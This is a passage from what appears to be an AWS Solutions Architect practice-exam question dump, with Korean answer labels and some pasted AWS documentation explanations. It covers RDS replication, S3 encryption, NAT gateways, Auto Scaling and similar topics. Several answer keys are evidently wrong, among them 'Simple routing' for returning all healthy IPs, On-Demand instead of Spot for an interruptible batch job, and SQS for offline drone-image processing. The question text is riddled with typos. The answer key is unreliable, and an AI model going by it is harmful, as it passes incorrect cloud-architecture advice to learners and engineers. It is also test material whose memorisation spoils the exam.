for Redis cache to the application stack. Update the application to point to the Redis cache endpoint instead of DynamoDB. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a website deployed on AWS. The database backend is hosted on Amazon RDS for MySQL with a primary instance and five read replicas to support scaling needs. The read replicas should lag no more than 1 second behind the primary instance to support the user experience As traffic on the website continues to increase, the replicas are falling further behind during periods of peak load, resulting in complaints from users when searches yield inconsistent results A solutions architect needs to reduce the replication lag as much as possible, with minimal changes to the application code or operational requirements Which solution meets these requirements?\nA. Migrate the database to Amazon Aurora MySQL Replace the MySQL read replicas with Aurora Replicas and enable Aurora Auto Scaling B. Deploy an Amazon ElastiCache for Redis cluster in front of the database Modify the website to check the cache before querying the database read endpoints C. Migrate the database from Amazon RDS to MySQL running on Amazon EC2 compute instances. Choose very large compute optimized instances for all replica nodes. D. Migrate the database to Amazon DynamoDB Initially provision a large number of read capacity units (RCUs) to support the required throughput with on-demand capacity scaling enabled \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solution architect must design a solution that uses Amazon CloudFront with an Amazon S3 to store a static website. The company security policy requires that all websites traffic be inspected by AWS WAF. How should the solution architect company with these requirements?\nA. Configure an S3 bucket policy to accept requests coming from the AWS WAF Amazon Resource Name (ARN) only B. Configure Amazon CloudFront to forward all incoming requests to AWS WAF before requesting content from the S3 origin, C. Configure a security group that allows Amazon CloudFront IP addresses to access Amazon S3 only Associate AWS WAF to CloudFront. D. Configure Amazon CloudFront and Amazon S3 to use an origin access identity (OAI) to restrict access to the S3 bucket. Enable AWS WAF on the distribution. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A disaster response team is using drones to collect images ot recent storm damage. The response team\u0026rsquo;s laptops lack the storage and compute capacity to transfer the images and process the data. While the team has Amazon EC2 instances for processing and Amazon S3 buckets for storage, network connectivity is intermittent and unreliable. The images need to be processed to evaluate the damage. What should a solutions architect recommend?\nA. Use AWS Snowball Edge devices to process and store the images. B. Upload the images to Amazon Simple Queue Service (Amazon SOS) during intermittent connectivity to EC2 instances. C. Configure Amazon Kinesis Data Firehose to create multiple delivery streams aimed separately at the S3 buckets for storage and the EC2 instances for processing the images. D. Use AWS Storage Gateway pre-installed on a hardware appliance to cache the images locally for Amazon S3 to process the images when connectivity becomes available. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A group requires permissions to list an Amazon S3 bucket and delete objects from that bucket. An administrator has created the following IAM policy to provide access to the bucket and applied that policy to the group. The group is not able to delete objects in the bucket. The company follows least-privilege access rules.\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Action\u0026#34;: [ \u0026#34;s3:ListBucket\u0026#34;, \u0026#34;s3:DeleteObject\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::bucket-name\u0026#34; ], \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34; } ] }  A. Option A\n\u0026#34;Action\u0026#34;: [ \u0026#34;s3:*Object\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::bucket-name/*\u0026#34; ], \u0026#34;Effect\u0026#34; \u0026#34;Allow\u0026#34;  B. Option B\n\u0026#34;Action\u0026#34;: [ \u0026#34;s3:*\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::bucket-name/*\u0026#34; ], \u0026#34;Effect\u0026#34; \u0026#34;Allow\u0026#34;  C. Option C\n\u0026#34;Action\u0026#34;: [ \u0026#34;s3:*DeleteObject\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::bucket-name*\u0026#34; ], \u0026#34;Effect\u0026#34; \u0026#34;Allow\u0026#34;  D. Option D\n\u0026#34;Action\u0026#34;: [ \u0026#34;s3:*DeleteObject\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::bucket-name/*\u0026#34; ], \u0026#34;Effect\u0026#34; \u0026#34;Allow\u0026#34; \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company\u0026rsquo;s application hosted on Amazon EC2 instances needs to access an Amazon S3 bucket. Due to data sensitivity, traffic cannot traverse the internet How should a solutions architect configure access?\nA. Create a private hosted zone using Amazon Route 53.\nB. Configure a VPC gateway endpoint for Amazon S3 in the VPC.\nC. Configure AWS PrivateLink between the EC2 instance and the S3 bucket.\nD. Set up a site-to-site VPN connection between the VPC and the S3 bucket. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is preparing to store confidential data in Amazon S3. For compliance reasons, the data must be encrypted at rest. Encryption key usage must be logged for auditing purposes. Keys must be rotated every year. Which solution meets these requirements and is the MOST operationally efficient?\nA. Server-side encryption with customer-provided keys (SSE-C) B. Server-side encryption with Amazon S3 managed keys (SSE-S3) C. Server-side encryption with AWS KMS (SSE-KMS) customer master keys (CMKs) with manual rotation D. Server-side encryption with AWS KMS (SSE-KMS) customer master keys (CMKs) with automatic rotation \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company built an application that lets users check in to places they visit, rank the places, and add reviews about their experiences The application is successful with a rapid increase in the number of users every month The chief technology officer fears the database supporting the current Infrastructure may not handle the new load the following month because the single Amazon RDS for MySQL instance has triggered alarms related lo resource exhaustion due to read requests. What can a solutions architect recommend to prevent service Interruptions at the database layer with minimal changes to code?\nA. Create RDS read replicas and redirect read-only traffic to the read replica endpoints Enable a Multi-AZ deployment. B. Create an Amazon EMR cluster and migrate the data to a Hadoop Distributed File System (HDFS) with a replication factor of 3. C. Create an Amazon ElastiCache cluster and redirect all read-only traffic to the cluster. Set up the cluster to be deployed m three Availability Zones. D. Create an Amazon DynamoDB table to replace the RDS instance and redirect all read-only traffic to the DynamoDB table Enable DynamoDB Accelerator to offload traffic from the main table. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is planning to migrate its virtual server-based workloads to AWS The company has internet-facing load balancers backed by application servers. The application servers rely on patches from an internet-hosted repository Which services should a solutions architect recommend be hosted on the public subnet? (Select TWO.)\nA. NAT gateway B. Amazon RDS DB instances C. Application Load Balancers D. Amazon EC2 application servers E. Amazon Elastic File System (Amazon EFS) volumes \r문제 풀이\r...\r\rAnswer: A C \r\r\r   QUESTION A solutions architect is designing a solution to access a catalog of images and provide users with the ability to submit requests to customize images Image customization parameters will be in any request sent to an AWS API Gateway API The customized image will be generated on demand, and users will receive a link they can click to view or download their customized image The solution must be highly available for viewing and customizing images What is the MOST cost-effective solution to meet these requirements?\nA. Use Amazon EC2 instances to manipulate the original image into the requested customization Store the original and manipulated images in Amazon S3 Configure an Elastic Load Balancer in front of the EC2 instances B. Use AWS Lambda to manipulate the original image to the requested customization Store the original and manipulated images in Amazon S3 Configure an Amazon CloudFront distribution with the S3 bucket as the origin C. Use AWS Lambda to manipulate the original image to the requested customization Store the original images in Amazon S3 and the manipulated images in Amazon DynamoDB Configure an Elastic Load Balancer in front of the Amazon EC2 instances D. Use Amazon EC2 instances to manipulate the original image into the requested customization Store the original images in Amazon S3 and the manipulated images in Amazon DynamoDB Configure an Amazon CloudFront distribution with the S3 bucket as the origin \r문제 풀이\r...\r\rAnswer: B Explanation AWS Lambda is a compute service that lets you run code without provisioning or managing servers. AWS Lambda executes your code only when needed and scales automatically, from a few requests per day to thousands per second. You pay only for the compute time you consume - there is no charge when your code is not running. With AWS Lambda, you can run code for virtually any type of application or backend service - all with zero administration. AWS Lambda runs your code on a high -availability compute infrastructure and performs all of the administration of the compute resources, including server and operating system maintenance, capacity provisioning and automatic scaling, code monitoring and logging. All you need to do is supply your code in one of the languages that AWS Lambda supports. Storing your static content with S3 provides a lot of advantages. But to help optimize your application\u0026rsquo;s performance and security while effectively managing cost, we recommend that you also set up Amazon CloudFront to work with your S3 bucket to serve and protect the content. CloudFront is a content delivery network (CDN) service that delivers static and dynamic web content, video streams, and APIs around the world, securely and at scale. By design, delivering data out of CloudFront can be more cost effective than delivering it from S3 directly to your users. CloudFront serves content through a worldwide network of data centers called Edge Locations. Using edge servers to cache and serve content improves performance by providing content closer to where viewers are located. CloudFront has edge servers in locations all around the world https://docs.aws.amazon.com/lambda/latest/dg/welcome.html https://aws.amazon.com/blogs/networking-and-content-delivery/amazon-s3-amazon-cloudfront-amatch-made-in\r\r\r\r   QUESTION A company has an application that posts messages to Amazon SQS Another application polls the queue and processes the messages in an l/O-intensive operation The company has a service level agreement (SLA) that specifies the maximum amount of time that can elapse between receiving the messages and responding to the users Due to an increase in the number of messages the company has difficulty meeting its SLA consistently. What should a solutions architect do to help improve the application\u0026rsquo;s processing time and ensure it can handle the load at any level?\nA. Create an Amazon Machine Image (AMI) from the instance used for processing Terminate the instance and replace it with a larger size. B. Create an Amazon Machine Image (AMI) from the instance used for processing Terminate the instance and replace it with an Amazon EC2 Dedicated Instance C. Create an Amazon Machine image (AMI) from the instance used for processing Create an Auto Scaling group using this image in its launch configuration Configure the group with a target tracking policy to keep us aggregate CPU utilization below 70% D. Create an Amazon Machine Image (AMI) from the instance used for processing Create an Auto Scaling group using this image in its launch configuration Configure the group with a target tracking policy based on the age of the oldest message in the SQS queue \r문제 풀이\r...\r\rAnswer: D  SLA는 메시지의 기간을 기반으로 합니다.  \r\r\r   QUESTION A company hosts its web application on AWS using seven Amazon EC2 instances The company requires that the IP addresses of all healthy EC2 instances be returned in response to DNS queries. Which policy should be used to meet this requirement?\nA. Simple routing policy B. Latency routing policy C. Multivalue routing policy D. Geolocation routing policy \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company relies on an application that needs at least 4 Amazon EC2 instances during regular traffic and must scale up to 12 EC2 instances during peak loads. The application is critical to the business and must be highly available Which solution will meet these requirements?\nA. Deploy the EC2 instances in an Auto Scaling group Set the minimum to 4 and the maximum to M, with 2 in Availability Zone A and 2 in Availability Zone B B. Deploy the EC2 instances in an Auto Scaling group Set the minimum to 4 and the maximum to 12, with all 4 in Availability Zone A C. Deploy the EC2 instances in an Auto Scaling group Set the minimum to 8 and the maximum to 12, with 4 in Availability Zone A and 4 in Availability Zone B D. Deploy the EC2 instances in an Auto Scaling group Set the minimum to 8 and the maximum to 12 with all 8 in Availability Zone A \r문제 풀이\r...\r\rAnswer: C  최소 4개라는 것에 유의해야합니다.  \r\r\r   QUESTION A company has recently updated its internal security standards. The company must now ensure all Amazon S3 buckets and Amazon Elastic Block Store (Amazon EBS) volumes are encrypted with keys created and periodically rotated by internal security specialists. The company is looking for a native, software-based AWS service to accomplish this goal. What should a solutions architect recommend as a solution?\nA. Use AWS Secrets Manager with customer master keys (CMKs) to store master key material and apply a routine to create a new CMK periodically and replace it in AWS Secrets Manager. B. Use AWS Key Management Service (AWS KMS) with customer master keys (CMKs) to store master key material and apply a routing to re-create a new key periodically and replace it in AWS KMS. C. Use an AWS CloudHSM cluster with customer master keys (CMKs) to store master key material and apply a routine a re-create a new key periodically and replace it in the CloudHSM cluster nodes. D. Use AWS Systems Manager Parameter Store with customer master keys (CMKs) keys to store master key material and apply a routine to re-create a new periodically and replace it in the Parameter Store. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION An engineering team is developing and deploying AWS Lambda functions. The team needs to create roles and manage policies in AWS IAM to configure the permissions of the Lambda functions. How should the permissions for the team be configured so they also adhere to the concept of least privilege?\nA. Create an IAM role with a managed policy attached Allow the engineering team and the Lambda functions to assume this role B. Create an IAM group for the engineering team with an lAMFullAccess policy attached Add all the users from the team to this IAM group C. Create an execution role for the Lambda functions. Attach a managed policy that has permission boundaries specific to these Lambda functions D. Create an IAM role with a managed policy attached that has permission boundaries specific to the Lambda functions Allow the engineering team to assume this role. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company wants to migrate its MySQL database from on premises to AWS. The company recently experienced a database outage that significantly impacted the business. To ensure this does not happen again, the company wants a reliable database solution on AWS that minimizes data loss and stores every transaction on at least two nodes. Which solution meets these requirements?\nA. Create an Amazon RDS DB instance with synchronous replication to three nodes in three Availability Zones. B. Create an Amazon RDS MySQL DB instance with Multi-AZ functionality enabled to synchronously replicate the data C. Create an Amazon RDS MySQL DB instance and then create a read replica in a separate AWS Region that synchronously replicates the data. D. Create an Amazon EC2 instance with a MySQL engine installed that triggers an AWS Lambda function to synchronously replicate the data to an Amazon RDS MySQL DB instance. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company built a food ordering application that captures user data and stores it for future analysis The application\u0026rsquo;s static front end is deployed on an Amazon EC2 instance The front-end application sends the requests to the backend application running on separate EC2 instance The backend application then stores the data in Amazon RDS What should a solutions architect do to decouple the architecture and make it scalable?\nA. Use Amazon S3 to serve the front-end application which sends requests to Amazon EC2 to execute the backend application The backend application will process and store the data in Amazon RDS B. Use Amazon S3 to serve the front-end application and write requests to an Amazon Simple Notification Service (Amazon SNS) topic Subscribe Amazon EC2 instances to the HTTP/HTTPS endpoint of the topic and process and store the data in Amazon RDS C. Use an EC2 instance to serve the front end and write requests to an Amazon SQS queue Place the backend instance in an Auto Scaling group and scale based on the queue depth to process and store the data in Amazon RDS D. Use Amazon S3 to serve the static front-end application and send requests to Amazon API Gateway which writes the requests to an Amazon SQS queue Place the backend instances in an Auto Scaling group and scale based on the queue depth to process and store the data in Amazon RDS \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is concerned that two NAT instances in use will no longer be able to support the traffic needed for the company\u0026rsquo;s application. A solutions architect wants to implement a solution that is highly available fault tolerant, and automatically scalable What should the solutions architect recommend?\nA. Remove the two NAT instances and replace them with two NAT gateways in the same Availability Zone. B. Use Auto Scaling groups with Network Load Balancers for the NAT instances in different Availability Zones. C. Remove the two NAT instances and replace them with two NAT gateways in different Availability Zones. D. Replace the two NAT instances with Spot Instances in different Availability Zones and deploy a Network Load Balancer. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect needs to design a low-latency solution for a static single-page application accessed by users utilizing a custom domain name. The solution must be serverless, encrypted in transit, and cost-effective. Which combination of AWS services and features should the solutions architect use? (Select TWO.)\nA. Amazon S3 B. Amazon EC2 C. AWS Fargate D. Amazon CloudFront E. Elastic Load Balancer \r문제 풀이\r...\r\rAnswer: A D \r\r\r   QUESTION A company is processing data on a daily basis The results of the operations are stored in an Amazon S3 bucket, analyzed daily for one week, and then must remain immediately accessible for occasional analysis What is the MOST cost-effective storage solution alternative to the current configuration?\nA. Configure a lifecycle policy to delete the objects after 30 days B. Configure a lifecycle policy to transition the objects to Amazon S3 Glacier after 30 days. C. Configure a lifecycle policy to transition the objects to Amazon S3 Standard-Infrequent Access (S3 Standard-IA) after 30 days D. Configure a lifecycle policy to transition the objects to Amazon S3 One Zone-Infrequent Access (S3 One Zone-IA) after 30 days. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a highly dynamic batch processing job that uses many Amazon EC2 instances to complete it. The job is stateless in nature, can be started and stopped at any given time with no negative impact, and typically takes upwards of 60 minutes total to complete The company has asked a solutions architect to design a scalable and cost-effective solution that meets the requirements of the job. What should the solutions architect recommend?\nA. Implement EC2 Spot Instances B. Purchase EC2 Reserved Instances C. Implement EC2 On-Demand Instances D. Implement the processing on AWS Lambda \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a live chat application running on list on-premises servers that use WebSockets. The company wants to migrate the application to AWS Application traffic is inconsistent, and the company expects there to be more traffic with sharp spikes in the future. The company wants a highly scalable solution with no server maintenance nor advanced capacity planning Which solution meets these requirements?\nA. Use Amazon API Gateway and AWS Lambda with an Amazon DynamoDB table as the data store Configure the DynamoDB table for provisioned capacity B. Use Amazon API Gateway and AWS Lambda with an Amazon DynamoDB table as the data store Configure the DynaiWDB table for on-demand capacity C. Run Amazon EC2 instances behind an Application Load Balancer in an Auto Scaling group with an Amazon DynamoDB table as the data store Configure the DynamoDB table for on-demand capacity D. Run Amazon EC2 instances behind a Network Load Balancer in an Auto Scaling group with an Amazon DynamoDB table as the data store Configure the DynamoDB table for provisioned capacity \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company hosts its core network services, including directory services and DNS. in its onpremises data center. The data center is connected to the AWS Cloud using AWS Direct Connect (DX) Additional AWS accounts are planned that will require quick, cost-effective, and consistent access to these network services What should a solutions architect implement to meet these requirements with the LEAST amount of operational overhead?\nA. Create a DX connection in each new account Route the network traffic to the on-premises servers B. Configure VPC endpoints in the DX VPC for all required services Route the network traffic to the on-premises servers. C. Create a VPN connection between each new account and the DX VPp, Route the network traffic to the on-premises servers D. Configure AWS Transit Gateway between the accounts Assign DX to the transit gateway and route network traffic to the on-premises servers \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is experiencing growth as demand for its product has increased The company\u0026rsquo;s existing purchasing application is slow when traffic spikes The application is a monolithic three tier application that uses synchronous transactions and sometimes sees bottlenecks in the application tier A solutions architect needs to design a solution that can meet required application response times while accounting for traffic volume spikes. Which solution will meet these requirements?\nA. Vertically scale the application instance using a larger Amazon EC2 instance size. B. Scale the application\u0026rsquo;s persistence layer horizontally by introducing Oracle RAC on AWS C. Scale the web and application tiers horizontally using Auto Scaling groups and an Application Load Balancer D. Decouple the application and data tiers using Amazon Simple Queue Service (Amazon SQS) with asynchronous AWS Lambda calls. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a 143 TB MySQL database that it wants to migrate to AWS. The plan is to use Amazon Aurora MySQL as the platform going forward. The company has a 100 Mbps AWS Direct Connect connection to Amazon VPC. Which solution meets the company\u0026rsquo;s needs and takes the LEAST amount of time?\nA. Use a gateway endpoint for Amazon S3 Migrate the data to Amazon S3 Import the data into Aurora B. Upgrade the Direct Connect link to 500 Mbps. Copy the data to Amazon S3 Import the data into Aurora C. Order an AWS Snowmobile and copy the database backup to it. Have AWS import the data into Amazon S3 Import the backup into Aurora D. Order four 50-TB AWS Snowball devices and copy the database backup onto them. Have AWS import the data into Amazon S3 Import the data into Aurora \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has an application workflow that uses an AWS Lambda function to download and decrypt files from Amazon S3 These files are encrypted using AWS Key Management Service Customer Master Keys (AWS KMS CMKs) A solutions architect needs to design a solution that will ensure the required permissions are set correctly. Which combination of actions accomplish this? (Select TWO.)\nA. Attach the kms.decrypt permission to the Lambda function\u0026rsquo;s resource policy. B. Grant the decrypt permission for the Lambda IAM role in the KMS key\u0026rsquo;s policy C. Grant the decrypt permission for the Lambda resource policy in the KMS key\u0026rsquo;s policy. D. Create a new IAM policy with the kms:decrypt permission and attach the policy to the Lambda function E. Create a new IAM role with the kms decrypt permission and attach the execution role to the Lambda function. \r문제 풀이\r...\r\rAnswer: B E \r\r\r   QUESTION 201-300    QUESTION A company\u0026rsquo;s application runs on Amazon EC2 instances behind an Application Load Balancer (ALB) The instances run in an Amazon EC2 Auto Scaling group across multiple Availability Zones On the first day of every month at midnight the application becomes much slower when the month-end financial calculation batch executes This causes the CPU utilization of the EC2 instances to immediately peak to 100%. which disrupts the application What should a solutions architect recommend to ensure the application is able to handle the workload and avoid downtime?\nA. Configure an Amazon CloudFront distribution in front of the ALB B. Configure an EC2 Auto Scaling simple scaling policy based on CPU utilization C. Configure an EC2 Auto Scaling scheduled scaling policy based on the monthly schedule. D. Configure Amazon ElastiCache to remove some of the workload from the EC2 instances\n\r문제 풀이\r...\r\rAnswer: C Explanation Scheduled Scaling for Amazon EC2 Auto Scaling Scheduled scaling allows you to set your own scaling schedule. For example, let\u0026rsquo;s say that every week the traffic to your web application starts to increase on Wednesday, remains high on Thursday, and starts to decrease on Friday. You can plan your scaling actions based on the predictable traffic patterns of your web application. Scaling actions are performed automatically as a function of time and date. https://docs.aws.amazon.com/autoscaling/ec2/userguide/schedule_time.html\r\r\r\r   QUESTION A company had a build server that is in an Auto Scaling group and often has multiple Linux instances running. The build server requires consistent and mountable shared NFS storage for jobs and configurations. Which storage option should a solutions architect recommend?\nA. Amazon S3 B. Amazon FSx C. Amazon Elastic Block Store (Amazon EBS) D. Amazon Elastic File System (Amazon EFS) \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company\u0026rsquo;s website runs on Amazon EC2 instances behind an Application Load Balancer (ALB) The website has a mix of dynamic and static content Users around the globe are reporting that the website is slow Which set of actions will improve website performance for users worldwide?\nA. Create an Amazon CloudFront distribution and configure the ALB as an origin Then update the Amazon Route 53 record to point to the CloudFront distribution B. Create a latency-based Amazon Route 53 record for the ALB Then launch new EC2 instances with larger instance sizes and register the instances with the ALB C. Launch nev. EC2 instances hosting the same web application in different Regions closer to the users. Then register the instances with the same ALB using cross-Region VPC peering D. Host the website in an Amazon S3 bucket in the Regions closest to the users and delete the ALB and EC2 instances Then update an Amazon Route 53 record to point to the S3 buckets \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is building a media-sharing application and decides to use Amazon S3 for storage. When a media file is uploaded the company starts a multi-step process to create thumbnails, identify objects in the images, transcode videos into standard formats and resolutions and extract and store the metadata to an Amazon DynamoDB table. The metadata is used for searching and navigation. The amount of traffic is variable The solution must be able to scale to handle spikes in load without unnecessary expenses. What should a solutions architect recommend to support this workload?\nA. Build the processing into the website or mobile app used to upload the content to Amazon S3 Save the required data to the DynamoDB table when the objects are uploaded B. Trigger AWS Step Functions when an object is stored in the S3 bucket Have the Step Functions perform the steps needed to process the object and then write the metadata to the DynamoDB table C. Trigger an AWS Lambda function when an object is stored in the S3 bucket Have the Lambda function start AWS Batch to perform the steps to process the object Place the object data in the DynamoDB table when complete D. Trigger an AWS Lambda function to store an initial entry in the DynamoDB table when an object is uploaded to Amazon S3. Use a program running on an Amazon EC2 instance in an Auto Scaling group to poll the index for unprocess use the program to perform the processing \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A solutions architect at an ecommerce company wants to back up application log data to Amazon S3 The solutions architect is unsure how frequently the logs will be accessed or which logs will be accessed the most The company wants to keep costs as low as possible by using the appropriate S3 storage class. Which S3 storage class should be implemented to meet these requirements?\nA. S3 Glacier B. S3 Intelligent-Tiering C. S3 Standard-Infrequent Access (S3 Standard-IA) D. S3 One Zone-Infrequent Access (S3 One Zone-IA) \r문제 풀이\r...\r\rAnswer: B Explanation S3 Intelligent-Tiering S3 Intelligent-Tiering is a new Amazon S3 storage class designed for customers who want to optimize storage costs automatically when data access patterns change, without performance impact or operational overhead. S3 Intelligent-Tiering is the first cloud object storage class that delivers automatic cost savings by moving data between two access tiers - frequent access and infrequent access - when access patterns change, and is ideal for data with unknown or changing access patterns . S3 Intelligent-Tiering stores objects in two access tiers: one tier that is optimized for frequent access and another lower-cost tier that is optimized for infrequent access. For a small monthly monitoring and automation fee per object, S3 Intelligent-Tiering monitors access patterns and moves objects that have not been accessed for 30 consecutive days to the infrequent access tier. There are no retrieval fees in S3 Intelligent-Tiering. If an object in the infrequent access tier is accessed later, it is automatically moved back to the frequent access tier. No additional tiering fees apply when objects are moved between access tiers within the S3 Intelligent-Tiering storage class. S3 Intelligent-Tiering is designed for 99.9% availability and 99.999999999% durability, and offers the same low latency and high throughput performance of S3 Standard. https://aws.amazon.com/about-aws/whats-new/2018/11/s3-intelligent-tiering/\r\r\r\r   QUESTION An online shopping application accesses an Amazon RDS Multi-AZ DB instance. Database performance is slowing down the application. After upgrading to the next-generation instance type, there was no significant performance improvement. Analysis shows approximately 700 IOPS are sustained, common queries run for long durations and memory utilization is high. Which application change should a solutions architect recommend to resolve these issues?\nA. Migrate the RDS instance to an Amazon Redshift cluster and enable weekly garbage collection B. Separate the long-running queries into a new Multi AZ RDS database and modify the application to query whichever database is needed C. Deploy a two-node Amazon ElastiCache cluster and modify the application to query the cluster first and query the database only if needed D. Create an Amazon Simple Queue Service (Amazon SQS) FIFO queue for common queries and query it first and query the database only if needed\n\r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION What should a solutions architect do to ensure that all objects uploaded to an Amazon S3 bucket are encrypted?\nA. Update the bucket policy to deny if the PutObject does not have an s3 x-amz-acl header set B. Update the bucket policy to deny if the PutObject does not have an s3 x-amz-acl header set to private C. Update the bucket policy to deny if the PutObject does not have an aws SecureTransport header set to true D. Update the bucket policy to deny if the PutObject does not have an x-amz-server-side-encryption header set \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has been storing analytics data in an Amazon RDS instance for the past few years. The company asked a solutions architect to find a solution that allows users to access this data using an API The expectation is that the application will experience periods of inactivity but could receive bursts of traffic within seconds Which solution should the solutions architect suggest?\nA. Set up an Amazon API Gateway and use Amazon ECS. B. Set up an Amazon API Gateway and use AWS Elastic Beanstalk. C. Set up an Amazon API Gateway and use AWS Lambda functions D. Set up an Amazon API Gateway and use Amazon EC2 with Auto Scaling \r문제 풀이\r...\r\rAnswer: C Explanation AWS Lambda With Lambda, you can run code for virtually any type of application or backend service - all with zero administration. Just upload your code and Lambda takes care of everything required to run and scale your code with high availability. You can set up your code to automatically trigger from other AWS services or call it directly from any web or mobile app. Amazon API Gateway Amazon API Gateway is a fully managed service that makes it easy for developers to create, publish, maintain, monitor, and secure APIs at any scale. APIs act as the \u0026ldquo;front door\u0026rdquo; for applications to access data, business logic, or functionality from your backend services. Using API Gateway, you can create RESTful APIs and WebSocket APIs that enable real-time two-way communication applications. API Gateway supports containerized and serverless workloads, as well as web applications. API Gateway handles all the tasks involved in accepting and processing up to hundreds of thousands of concurrent API calls, including traffic management, CORS support, authorization and access control, throttling, monitoring, and API version management. API Gateway has no minimum fees or startup costs. You pay for the API calls you receive and the amount of data transferred out and, with the API Gateway tiered pricing model, you can reduce your cost as your API usage scales. https://aws.amazon.com/lambda/ https://aws.amazon.com/api-gateway/\r\r\r\r   QUESTION A company\u0026rsquo;s application is running on Amazon EC2 instances m a single Region in the event of a disaster a solutions architect needs to ensure that the resources can also be deployed to a second Region Which combination of actions should the solutions architect take to accomplish this? (Select TWO)\nA. Detach a volume on an EC2 instance and copy it to Amazon S3 B. Launch a new EC2 instance from an Amazon Machine image (AMI) in a new Region C. Launch a new EC2 instance in a new Region and copy a volume from Amazon S3 to the new instance D. Copy an Amazon Machine Image (AMI) of an EC2 instance and specify a different Region for the destination E. Copy an Amazon Elastic Block Store (Amazon EBS) volume from Amazon S3 and launch an EC2 instance in the destination Region using that EBS volume \r문제 풀이\r...\r\rAnswer: B D Explanation Cross Region EC2 AMI Copy We know that you want to build applications that span AWS Regions and we\u0026rsquo;re working to provide you with the services and features needed to do so. We started out by launching the EBS Snapshot Copy feature late last year. This feature gave you the ability to copy a snapshot from Region to Region with just a couple of clicks. In addition, last month we made a significant reduction (26% to 83%) in the cost of transferring data between AWS Regions, making it less expensive to operate in more than one AWS region. Today we are introducing a new feature: Amazon Machine Image (AMI) Copy. AMI Copy enables you to easily copy your Amazon Machine Images between AWS Regions. AMI Copy helps enable several key scenarios including: Simple and Consistent Multi-Region Deployment - You can copy an AMI from one region to another, enabling you to easily launch consistent instances based on the same AMI into different regions. Scalability - You can more easily design and build world-scale applications that meet the needs of your users, regardless of their location. Performance - You can increase performance by distributing your application and locating critical components of your application in closer proximity to your users. You can also take advantage of region-specific features such as instance types or other AWS services. Even Higher Availability - You can design and deploy applications across AWS regions, to increase availability. Once the new AMI is in an Available state the copy is complete. https://aws.amazon.com/blogs/aws/ec2-ami-copy-between-regions/\r\r\r\r   QUESTION A company runs a web service on Amazon EC2 instances behind an Application Load Balancer The instances run in an Amazon EC2 Auto Scaling group across two Availability ones I he company needs a minimum of tour instances at all limes to meet the required service level agreement (SLA) while keeping costs low If an Availability Zone tails, how can the company remain compliant with the SLA?\nA. Add a target tracking scaling policy with a short cooldown period B. Change the Auto Scaling group launch configuration to use a larger instance type C. Change the Auto Scaling group to use six servers across three Availability Zones D. Change the Auto Scaling group to use eight servers across two Availability Zones \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION An operations team has a standard that states IAM policies should not be applied directly to users. Some new members have not been following this standard. The operation manager needs a way to easily identify the users with attached policies. What should a solutions architect do to accomplish this?\nA. Monitor using AWS CloudTrail B. Create an AWS Config rule to run daily C. Publish IAM user changes lo Amazon SNS D. Run AWS Lambda when a user is modified \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect needs to design a managed storage solution for a company\u0026rsquo;s application that includes high-performance machine learning This application runs on AWS Fargate and the connected storage needs to have concurrent access to files and deliver high performance. Which storage option should the solutions architect recommend?\nA. Create an Amazon S3 bucket for the application and establish an IAM role for Fargate to communicate with Amazon S3 B. Create an Amazon FSx for Lustre file share and establish an IAM role that allows Fargate to communicate with FSx for Lustre. C. Create an Amazon Elastic File System (Amazon EFS) file share and establish an IAM role that allows Fargate to communicate with Amazon EFS. D. Create an Amazon Elastic Block Store (Amazon EBS) volume for the application and establish an IAM role that allows Fargate to communicate with Amazon EBS \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is using Amazon EC2 to run its big data analytics workloads. These variable workloads run each night, and it is critical they finish by the start of business the following day. A solutions architect has been tasked with designing the MOST cost-effective solution. Which solution will accomplish this?\nA. Spot Fleet B. Spot Instances C. Reserved Instances D. On-Demand Instances \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company runs an application on Amazon EC2 Instances. The application is deployed in private subnets in three Availability Zones of the us-east-1 Region. The instances must be able to connect to the internet to download files The company wants a design that Is highly available across the Region. Which solution should be implemented to ensure that there are no disruptions to Internet connectivity?\nA. Deploy a NAT Instance In a private subnet of each Availability Zone. B. Deploy a NAT gateway in a public subnet of each Availability Zone. C. Deploy a transit gateway in a private subnet of each Availability Zone. D. Deploy an internet gateway in a public subnet of each Availability Zone. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has an application that calls AWS Lambda functions A recent code review found database 